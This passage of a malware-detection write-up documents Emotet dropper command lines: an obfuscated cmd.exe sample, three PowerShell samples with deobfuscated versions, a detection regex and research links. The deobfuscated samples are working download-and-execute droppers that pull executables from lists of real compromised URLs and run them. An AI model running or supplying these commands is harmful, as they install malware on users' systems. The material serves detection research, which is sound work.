^6qV^y=^e&&^se^t ^0Z=^o&&^set ^B^6F^L=^A&&^s^e^t ^q3^S=^'^,&&^se^t s^m^f=/^gr^a&&^s^e^t ^j^qE= ^ &&s^e^t h^O=^D.&&^s^e^t ^TUr=^p^:&&^s^e^t Vh^d^B=^a&&^s^e^t v^y=b^3^O&&^s^e^t ^yHO^S=^.S&&^s^et ^DfG^k=^ ^ &&^s^e^t e^s^Y=^Xa^=(&&^s^et rG^e^7=^f^D.^s^a&&s^e^t ^K^6=r^e&&^s^et w^m=^o^a&&^s^e^t ^0^w=^B&&^s^e^t ^H^9=C&&^s^et ^m^h2D=)^;&&s^e^t ^W^Z=^w&&^s^et ^T^x=o^m ^'&&^se^t ^w^k0=b^j&&s^e^t ^A^Dn^W=^'^\H&&^s^et ^Y1^q=^f^O^E&&^s^et E^H=^d&&^s^et ^6^y=p^li^t&&^se^t ^3^JtS=e($&&s^e^t j^U^B=^G&&^s^et ^K3^j=^a^t&&s^e^t ^7^G^TU=^dl&&^set ^qX=C^l&&^s^et ^b^3=^f&&s^e^t ^Y^B^pg=^O&&set ^3C^Ox=^p-&&^s^et ACr=^59&&^s^et G^5^D=^S&&s^e^t ^bz^F=^h&&^se^t Z^B=^h&&set ^Q^g=-^O^b&&s^e^t V^4^o=^t&&^se^t ^j^G92=^+&&^se^t ^i0^S=^ &&^s^et 7^0=^w^3^7&&^s^et ^S^t^W^j=^t&&^se^t R^U^s^6=^o&&^s^e^t ^q^S^G=^D&&^s^et ^2^dI=^f^D.t&&s^e^t ^0^U=pen()&&s^e^t M^s=ry^{^$&&c^al^l ^s^e^t k5Z=%^K^i^M^t%%1R^q%%^Jc%%v^h^Wi%%K^I%%^g^Y%%^4^D%%^t^p%%^b^x^WM%%^D^T^tc%%^qX%%A^0%%^4^a^K%%^Z^7%%^QGU^x%%^to^O%%^2d^I7%%^H^i^Z%%^a^L2%%^YM%%^t3%%^JS%%^4c^71%%1^E^M%%b^DA^x%%^ZLa^y%%^dCl^P%%^E^u%%^EN%%i^p%%^Y^B^pg%%^W^FJN%%^BW^e%%^H^eq%%^0G^J%%V^3%%Q^E%%tZ^7^W%%^yI^s%%v^P%%^is%%^K^6%%^dXw^b%%^Kn^y%%R^U^s^6%%^H^Xv%%^dS%%^1C%%^Tj%%^G^x^hU%%0^t%%^b^Tr^e%%^j^4^f%%^w^l%%^J^x^8%%^d^So%%J^K^a^X%%m^HR%%^1^2^9%%^z6e^b%%r^I%%^wD%%Q^x^P^q%%^s^k9^1%%^ST%%Z^B%%a4^x^o%%^2Q^f%%vCq%%Y^9%%^Id^B%%^jr%%v^y%%^6qV^y%%^W^4Q%%r^l^Ku%%^TUr%%^W^Bw%%ACr%%E^9%%^T^E6%%^T^M^3%%R^8J^S%%^1u%%^Y1^q%%G^5^D%%y^d^U%%^OV^Y%%^tu%%^B^S^0^u%%R^d%%K^8%%r^K^Yc%%s^m^f%%H^1^4%%^qd^4V%%^m^BR%%^Y^M^9z%%^3C^Ox%%^B^YJE%%M^S^J^7%%^W^E%%^a^tLc%%^t^EVR%%w^m%%^Z^3^u%%0^F%%7^0%%D^9^o%%^H^1Y^u%%5^K%%^yHO^S%%^6^y%%^zR%%^HP%%^4Q%%^oEK^b%%e^s^Y%%i^J^y%%^G^JC%%kCm%%^3J%%^E6%%^Dd%%^sr%%o8^W^u%%E0^X^G%%^7^u^e^H%%j^U^B%%Z^u^Mc%%^S^t^W^j%%^Mx%%^B^8^Q%%^OX^7%%^K3^j%%^b^TN%%^j^G92%%^A^Dn^W%%^7^G^TU%%^oL^G%%^y^KN%%^s^SX%%^qt%%o^yO^X%%v^s^y%%^qY^UC%%^1^8^df%%V^d%%^0^xR%%^w^k0%%^1^h%%^k3^4^X%%w^b%%^T^x%%A^2%%g^f%%R^f%%^oC%%Z^a^L^1%%^W^Fym%%^W5%%2nRM%%^k^2D^E%%^g3^Sb%%4^e%%r^4%%E^p^j%%^W^Z%%^Q^g%%^Bwn^i%%J^X%%^b^E^Kf%%^id%%^I^a%%^i0^S%%^68^AE%%^0Z%%0o^d%%^w^F^Ua%%6^k^o^D%%^s^o^3%%o^4%%V^4n^T%%^ov%%Vh^d^B%%^s^i^H%%^bz^F%%m^D^G^i%%z^l^h%%^q^sx%%^H^9%%z^w^Y^u%%^68%%V^0%%M^s%%^aT%%q^G^y%%V^toN%%r^L^x^U%%^q3^S%%^hs%%4^x^TL%%^an%%^H^04%%^ev^t%%^J^t^z%%^D^U^Y%%T^3^O%%E^H%%0^a^lV%%D^3^E%%E^P^i%%^b^3%%h^O%%j^AO^p%%^0^U%%^i^o%%^2^dI%%2H^f^l%%Z^A%%^a^sR%%^Sz^L%%^4m2%%^G^Hw%%^q^S^G%%7G^2^q%%^1^2^sW%%^2^Y^Fc%%^tM^5%%^3^JtS%%^0s%%^B^6F^L%%^h^1N%%^t^WR%%^qTY^D%%^0^w%%m^H6^u%%rN^D^W%%^Do^4y%%^6^X%%rG^e^7%%y^A%%^J^q^G%%^m^6%%k^7^t%%^3n%%q^D^oN%%^m^h2D%%Rr^8%%V^4^o%%^mhf%%tT^j^p%%z^6%%^Kn^F%%6P^z^7%%R^s%%M^G%%^7^8%%Ex^G%%^b^W^D%%^J^L^g%%3HV%%V^s%%^ho^s%%V^9^3%%rq%%Z^t%%^j^qE%%^Zu^GH%%^T^W^0D%%^am^h1%%^DfG^k%%^A^8%%^zXM^P%&&c^al^l %^k^5^Z%"
```

6. 64bit version
```
/V/C"set G2J= }}{hctac}}kaerb;nBQ$ ssecorP-tratS;)nBQ$(elifotevas.sBi$;)ydoBesnopser.AXI$(etirw.sBi$;1 = epyt.sBi$;)(nepo.sBi${ )'*ZM*' ekil- txetesnopser.AXI$( fI;)(dnes.AXI$;)0,Hjo$,'TEG'(nepo.AXI${yrt{)ZRM$ ni Hjo$(hcaerof;'maerts.bdoda' moc- tcejbO-weN = sBi$;'ptthlmx.2lmxsm' moc- tcejbO-weN= AXI$;)'exe.obw\'+)(htaPpmeTteG::]htaP.OI.metsyS[(=nBQ$;)'@'(tilpS.'oR8bFMaj/db.moc.stessamt//:ptth@cwPJPpash/ur.bps.llerauqa//:ptth@PY2y7DIo/ni.gro.egellochtanhtnukab//:ptth@TKjxdxTSnx/gro.npscdma//:ptth@lIOhbE9NV/moc.elbon13//:ptth'=ZRM$;'wwO'=jJQ$ llehsrewop&&for /L %B in (560,-1,0)do set XYT=!XYT!!G2J:~%B,1!&&if %B leq 0 %LOCALAPPDATA:~-12,-11%o%OS:~0,-9%e%ProgramFiles(x86):~7,1%%ProgramFiles(x86):~15,-6%h%ProgramW6432:~-2,1%l%ProgramFiles(x86):~13,1% "!XYT:*XYT!=!" "
 ```

* Powershell.exe

1.
```
"( [RuntIME.InteroPsERvICEs.marshAl]::([runtiME.IntErOpserViceS.marshal].GeTMEmbERS()[2].nAME).inVOKe([RUNtIme.intEropseRVICEs.MarShal]::SeCURestrINgtogLoBaLaLloCUnicOde( $('76492d1116743f0423413b16050a5345MgB8ADYAYwB4AHAAdgAxAHEAdQAvAEkAVQBXADQANQBrAFUAWgBkAEIANwBTAGcAPQA9AHwAYgAyADUAOQAwADMAYgBkAGMAOAA1AGMANwA0ADgAZgBhADUAYQBhAGIAYgBkADcAMwA1ADgAYwA3ADIANwA1ADAAZAA4AGEAYQBiADEANwBkADIAMwA3ADMANABlAGUAOAAxADUAZQA3ADAAOAAxADMAZQAyADIAZQBlADUAOAAxADcAMQAxAGUAOAA4ADUAOQAzADcAMwBlADcAOABmADYAYwA5ADkANAA3ADMAMABhAGMAMwAzADIAMQAxADcAYwA2AGQAMgAxADAAZQAyADQAZgAyAGUAMQA0ADMANABkAGIANAAxADAAMABlADAANAA0AGUAMwBjADYAYQAzAGUANgA2ADQAYQBmADgANwA4ADYAMQAwAGIAOAA2AGYAOQBmADYAOAAyAGUANAA4ADAAOAA3ADQAZgA4AGMAZQAxADUAYQAxADIAYwA5AGIAMgBmADcAYgBhAGQAYwAyADQANQAxADcAOQA4AGMANQA0AGMAYgAwADkAZAA0ADYAMAA4ADYAYQAyAGMAYwAxAGEANAA2ADQAZABmADUAMQBhADQAZQA3AGQAZABlADQANgA5AGQAYwA2ADIAOAA4ADEAMwBiADQAYwBlAGIANQA1ADYAMAAwADUAOQA1ADQAOQBmADAAMgBhADUAOQBiADQANABhAGMAZgAxADEANAA3ADcANgA2ADIAYgA4ADUANwA1ADUANQAxADEAOABlAGQAMAA2ADAAZABiADQAZABjAGMAYQBmADgAYQAzAGYAZQBhAGIAMgA0ADQANgBmADgAMwBlADQANwAyADcAYwBhAGIAMQA2ADIAOQA4ADcANwBlAGYAZAAwADYAYwAyADAAYgAyAGMANABlADIAYgBiAGQAYQA4ADQAZQAzADgAZgA2ADAANQAzAGIAYgBlAGUAZQAzAGQAZQBiAGYAMABkADMAZgA5AGUANwAzADYAZQAwADYANgA4ADUAZAA2ADkAMwBlAGUANwA1ADEAMgA1ADIAMAA3ADEAZgBjADQAMgAxADQAYwBjADYAMQBiADkAYgA0ADEAOQBjADQAOAAzADkANAAyADYAMQAzADgANAA4ADcAYQA5AGQANwAxADkAMAA5AGIANABjADUAYQBiADAAYQA2AGEANABjAGEANgBhADMAZgBiADgAOQBkAGEAZQBkAGUAYwBkAGUAZQA3AGQAYwBiAGEAMwA5ADAAMAA0AGMAMQA2AGMAOQA1AGQAYQA1AGUAYgBmAGYAYwBjADMAYQBlAGUANABiADQAMwBhADAAOQAxAGMAOQA5AGUAZAAzADAAZAA1ADMAOAAxAGUANQAzADAANABlADkAYwAxAGMAMwBmADAANQBlADYAYwA3AGYAMwAxADgANAAxADEANQA0ADIAOQA5AGMAZQA0AGUAMAAzADkAMgA5AGIANQAxADAANgA2ADAAOAA4AGIAMwAzAGYANgBiADcAOQBjAGQAZQA4AGYAZQAxAGYAOAAyADAANQAxADkANgBhAGMANAAzADMAYwAyAGYAYwBlADIAOAAwAGQANgA5ADQANgAwAGEANABlADAAZABjADYAYgBmADkAOAA5AGMAMwA0ADQAZgAzADIAZQBiAGMAOABkADcANwBhADkAMwAwAGQAMAA4AGEAZgA4ADkAYgAyAGUAZAAyAGQAMAA1ADEANwAxADMAOQA1ADIAOQBhAGUANgAzADYAMwBhADMAOQBiAGEAZQA4AGYAZQBiAGMAYQAyADMAYgAxADQAZQAyAGYAOABkAGUAOAA2AGIAOQA0AGYANAA0AGQAMABhADEAZgBmADAAOABjADkAYgBlAGQANABmAGIAMgBiADMAYQA5ADEAZgBiAGMANgAyADcAMwA4AGUAYQBjADAAZABlADkAZgBiAGUAYwAxAGUAOAA4ADkANwA5ADAAOAAyAGIANgAxADUAMQA3AGQAMwBmADUAZABkADMAZgBmADUAZQA1AGUANABlADMANgAzAGYANwA4ADMAMwA2AGEANgAyAGUANwAyADcAYQAyAGIAMwA2ADgAMgBiADUANAAxADcAOQBjADAAYgA5ADIAZQBjADQANQAxADcANwBmADIAYgBiADgAOAA0ADAANgAxAGMAMAA5ADgANgBkADcAMAA2ADcANwAxAGMAYgBiADEANgBmADEAMQAyADAANQA2AGMANQAyADkAMgAyADMAMQAwAGMAYQAyADkAOQBjADgAMwAyAGYANQBmADUAYgA4AGUAZgBhADAAZQBkADgANABjAGUAMQBiAGIAMgBlAGEANwAyAGQAYQA5ADcAOQAwADcAZgBjADgAZQA2ADQANwA2AGIANwA2ADgAZAAzAGUAZAAwADgANQBkADQAYwA4AGYAYwAxADAAZQBkADAAMQA2AGQANQAxADkAOQAxADUAZAA4ADgANwBjAGUAMgBkADgANwAxADAAMgBmADgANgAwADkANAA1AGEAOABkAGMAYgA4AGYAZQAwAGUAZQBkAGQAOQA5ADYANwBkADkAYQAzAGIANgBjAGMAZgBjAGIAMQA0ADEAZAAxADEAZABlADQAZgAwADgANAAyADcAOAA1ADYANwAyADUAOABhADEAZgBjADcAZQA3ADgANwA1ADUAYQBkADgAMgA3ADkAMgAxAGYAZgA1ADIAZQA0ADMAYwA2ADIAYQAwADEAOQBjADEAMgBiADgAOQAyADIAMgAwADAAOAA5ADEAYwBjADEAMAA4ADMAZQA2ADAAOQBkADQAMwAwADAAMQA1ADAANABjADQAYgA5ADMAMwAyAGEAMgA0ADYAMgAzADUANgA5ADgAMQBkADkAOQBjADgAMgAxADIAYwA0ADEANAA5AGYAZgBlADAAZAAyAGIAZQBhAGIAYgA5AGEANwBhADMAZAA3AGMAZAAxADgAOQBiADEAMQAzADUANABkAGUAOAAyAGQAMgAwAGUAMQAzAGQAZAA0AGEAZAA5ADIAYgA3AGQANwA3ADYAYwA0AGIAYwA0ADEAZAA1ADcAZgBlAGMAOQBmADcAZABjAGMAZQBiADcAZgBmADMAMAA1ADAAZQA3AGQANgBjADkAMQA0AGYANQBlADUAYgBjADIAOAAzADgAMQA3ADUAYQBjADAANgBhAGYAMgBiADAANwBlADYAZABlADYAZgA5ADEAMgBmADEAMgAyAGYAMAA3AGMANABhADMANwBhAGQANwAzADAANQBhADEAZABmAGMANAA5ADAAMgBlAGEAYQAwAGEAMwBkADQAYgA4ADQANgBlADcAZgAyADkAMQA3AGQAOABjADAANwA1AGQAYwA2ADEAOQBmADYAMwBiADQAMABmAGQAMwA3AGIAYQA4ADEAZAAzADQANABkADEAYwA0AGMAMgBiADQAMgBhADEANAA5AGMAZAA2AGUAYgAwAGMAZgAxADMAZgA3AGMAOQA4ADgANwAzADYAYwBjADIAMwA5ADgAMgA5AGIAZABlADIANwBiAGMAYgA0ADgAOAA3AGQAOAA3ADcANQA5ADIAMgAyADgAZQAwAGUAZgBmAGEAMAA3AGUAZgA5ADEANwAyADcAMwBlAGQANAAyADcAYgBhAGIAYgAzADEAMgA5AGYAOABlADUANQAwADQANgAwADQANQBmAGMAZABiAGQAMABjADQANQAxADYAYQAwADMANQA5ADQAOQAwAGUAYgAyAGUAMAAwAGEAOAAyAGEANQAxADEANgA2AGEANgA5ADEAMAA5AGQAYwA0AGMAZABmADkANwA5AGIAYgBkADIAZgA2AGQAZgBjADgAMABjAGUANgAxAGYAMwAyADUAZgBlADQAMgBlADQAOABkADAAMwAxADEANQBiADcANgA2ADUAMwBkAGEAOAAxADMAMgBkAGMAYQAxADQAYwA0ADMANAAyADkANwBmADAAOAA1AGEANwA5AGMANQBhADEANgBlADQAZAA5AGMAOAAyADMANgA1ADkAOAAwAGEAMwBlAGIAZABiADAAMQBmADkAZQA2AGYAMwAyAGIAMwAxADUAZABjADEAMQBlADMAYQBkAGYANgAxADEAZAAxADMAOQAyADIANQBmADgAOAAyAGMANwA4ADQAZgBmADQAMQBiAGQAZgBhADYAMABlADcAOQA4ADQANgA1ADEAYQBjADUAYwBjADcAMwA1ADMANwBjAGIANgA1ADQAZAA3ADIAOABjAGYAZQA0AGQAZgA2ADYAMQBkADEANQA3ADIAMQAyAGUAMwA3ADMAMAAxAGEAMABjADkAMQBhAGMAOQBhAGEAMQBkAGQAMgA2ADkAZgBiADcAYgA3AGUAYQBkAGYANAAwAGMANwBlADgAMwA3ADUAYwAxADgAYQA1AGEAMQA3ADcAMgBjAGEAMgAwADcAZgAzADMAOAA4AGEAZAA1ADcAZQBjADUAZQAwADkAMgAzAGYAZQBiAGMAYgA1ADAAZABjADUAMAA2AGEAYQAxAGYAYwBiAGQAYgBkAGIAMwBjADcANgAwADkAOABiADMAZQBmAGQAZAAzAGEAOQA4AGEAYgA3ADcANwBjAGMAMQAzAGEAMgA4ADMAYgBkAGUAMwA5ADgANQBiADMAMAAxAGQANQAxAGUANwA1AGUAYQA2ADgAZQA0AGUAYwBhAGUANABhAGUAOAA5AGMAZgAwADYAZQA0AGYAMQBlAGYAYQBkAGEAMAA1ADgAOQAzADAAMwAwADYAYwA5ADUANQA5AGMAMQBkADgANgBmADgANAAzADYAYwBjADIAMAAwADMAMgAwADMAMgBhADIAZABkADQAZQA0ADEAMwA2ADEANwA2ADQANwAxADIAYgAwADUAZgA1ADcAMAA3AGYAMgBjAGQANABjADAAZQA4ADgAMwBkAGQAYgA3ADgANAA2ADUAYgBkADAANgA4ADkAMgBkADEAOQBjADYAYQA0AGYAMgA2AGQAOABlAGYAZQBjAGIAMgBhADUAYQAyAGYAYQBjAGYAYwBjADIAZgAwADYANgA0ADkAZQAxADgAZABhADYAOQA2AGMANQAyADkAMQA5ADMAOQA3AGUANgA3ADEAMgAzAGUAOAA4AGYAYwA3AGIAMgA1ADIAYwAyAGYAMwAwADcAZABjADQAZgBhAGUANgA1ADEAMQAzADYANAA2ADgAYQA2AGQAMABjAGUAMgAwAGEAOQA3AGEAZgBjADAAZgBlADEAOQAxADkAZQA3AGQAOABhADYANgAwADUAMABkAGYAOQBmAGQAMwA=' |cOnvErtto-SeCureSTrINg -K (35..4)))))| . ( $VERBosePreFERENcE.TOStrIng()[1,3]+'x'-joIn'')
```

Deobfoscated
```
( [RuntIME.InteroPsERvICEs.marshAl]::([runtiME.IntErOpserViceS.marshal].GeTMEmbERS()[2].nAME).inVOKe($nsadasd = &(new-object) random;$YYU = .(new-object) System.Net.WebClient;$NSB = $nsadasd.next(10000, 282133);$ADCX =
http://lecap-services .fr/wiB9s/?http://nikitinskysport .ru/R5ytZ/?http://beauty-tea .com/hB2JAMO/?http://zekiatagur .com/gCWu/?http://arkonziv .com/Site7_Pixelhobbies/iV1PKqL/.Split(?);$SDC = $env:public  \  $NSB  ('.exe');foreach($asfc in $ADCX){try{$
YYU."Do`Wnl`OadFI`le"($asfc."ToStr`i`Ng"(), $SDC);&(Invoke-Item)($SDC);break;}catch{})
```


2.
```
SEt-ItEm ('V' + 'ARiAb'+'lE:SKeAil') ( [TYPe]( \"{2}{3}{1}{0}\"-F't','n','ENvIRon','ME' ) ) ; ( .('ls') ( \"{4}{0}{7}{1}{5}{2}{3}{6}\"-f'B','E:E','co','NteX','VarIA','XEcUTiOn','t','l') ).\"VaL`UE\".\"iN`VO`k`eCom`MANd\".( \"{3}{1}{2}{0}\" -f 'ipT','oke','SCr','inv' ).Invoke( ( ${sK`E`AiL}::(\"{0}{4}{1}{2}{5}{3}\" -f'get','ONMeNt','v','E','Envir','arIaBL').Invoke( 'DiY',(\"{1}{0}\"-f's','PrOCeS' ))) )

```
Deobfuscated
```
set-item ('variable:skeail') ( [type]( 'environment' ) ) ; ( .('ls') ('contextexecutionvariable') ).value.invokecommand.('invokescript' ).invoke( ( ${skeail}::('getenvironmentvariable').invoke( 'diy',('process' ))))

```

3.

```
$zWC='IUA';$QHY='http://trabanatours.com/u@http://pizzeriarondo.si/z8cG@http://diahmarsidi.com/MPCTKG@http://ogrodyusmiechu.pl/iubv8v@http://assurance-charente.fr/sfh'.Split('@');$aBp=([System.IO.Path]::GetTempPath()+'\mQN.exe');$pdZ =New-Object -com 'msxml2.xmlhttp';$tpk = New-Object -com 'adodb.stream';foreach($uiA in $QHY){try{$pdZ.open('GET',$uiA,0);$pdZ.send();$tpk.open();$tpk.type = 1;$tpk.write($pdZ.responseBody);$tpk.savetofile($aBp);Start-Process $aBp;break}catch{}}
```

#### Regular Expressions
---

* Powershell.exe

1.
``
^(?=.*\bRuntIME\.InteroPsERvICEs\.marshAl\b)(?=.*\bGeTMEmbERS()\b)(?=.*\bSeCureSTrINg\b)(?=.*\bTOStrIng\b)(?=.*\bjoIn\b).*$
``

#### Resources
---

Technical write-ups:
* https://blog.malwarebytes.com/threat-analysis/2018/05/malware-analysis-decoding-emotet-part-1/
* https://blog.malwarebytes.com/threat-analysis/2018/06/malware-analysis-decoding-emotet-part-2/
* https://github.com/d00rt/emotet_research/blob/master/doc/EN_emotet_packer_analysis_and_config_extraction_v1.pdf

Sandbox reports:
* https://www.hybrid-analysis.com/sample/707fedfeadbfa4248cfc6711b5a0b98e1684cd37a6e0544e9b7bde4b86096963?environmentId=100
* https://any.run/report/4e106b0156013a383d87c2978b5d318db6c110b38f32e8ea3b050525a10dbd3e/27e6f6dd-65b2-427b-ae71-31eaba74cabe
* https://any.run/report/e7f763412e9c481da6ed408781f6d0f91510ffaf02260d5c63aa495614c36664/a5be1e80-b73c-4f4b-a67f-524bc7aecab5
* https://any.run/report/895a3b6cc2799f681edde33cbbd1f0c7ba19010c89085030f6733771f75a7447/59d68dc1-416e-4785-bd74-6a3ed90e2d37 (@Lvanoel)

Notes:

For Cmd.exe 3. and Powershell.exe 2. :
* https://twitter.com/tagnullde/status/1061977580335702019
* CyberChef recipe for base64 part https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true)Raw_Inflate(0,0,'Adaptive',false,false)Split('http','%5C%5Cn%20http')&input=UFpCUlQ4SXdGSVgveWg2YUZJSmJOZnFnTkV0UVlZU0lLQkdVR0Y5S3VWdkx1cmFPYm1PUS9YY1pDYjZlKytXN0p3Y3R4L05RUStXYjlSYTQ4MmJnZ2k5WVB5c0oybEVVNVNMRXdqbmJKNFRuVEVzVE15NlpFc0NVRXdFM0dZblR5anlWMDFYeE1MaUEwZ3JJTXdpc0lodm1HSW1XdjdFY0o4bm9RbXlLeXVoQWd5T1Z0VDZ6bGh5K0ovTCtldnN5U2k1TXhoUVhNcFcrTlg1WkgweForSm5acFNWcnYxcW1heExYK3lLYWJ4Zi9WcWtUMkNWTUorZGk2ZVByNFRNZUR1VUtCeDlXU2RmQkE5eWw2RTB2dk5ERGQ3YzNtQ0plVFVNRXV1dzd5R3dQLytCZWUrL2hBUGFBYVd4eVlGeDAwT3k5OHFUMjJqMjZSNWZYUjNUYUxSaWFTaXZETnBGVWNHYXV2RmJZcFJOZG1oVDh5VWw2VHVqNjVFbHB3NW5qNHRnMGZ3PT0

For Cmd.exe 4. and Powershell.exe 3. :
* https://twitter.com/JRoosen/status/1062730072979881985 @JRoosen
